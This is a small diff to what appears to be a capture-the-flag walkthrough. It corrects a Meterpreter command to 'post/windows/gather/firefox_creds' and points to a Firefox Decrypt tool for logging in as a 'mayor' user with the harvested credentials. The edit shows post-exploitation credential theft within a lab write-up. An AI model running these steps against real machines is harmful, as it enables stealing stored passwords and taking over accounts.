@@ -563,7 +563,7 @@ O dear. Back to the drawing board. Ah.
 
 ```text
 meterpreter > run post/windows/gather/enum_applications
-meterpreter > run post/windows/gather/enum_applications
+meterpreter > run post/windows/gather/firefox_creds
 ```
 
 Then use the [Firefox Decrypt tool from Github](https://github.com/unode/firefox_decrypt), and log in to the "mayor" 
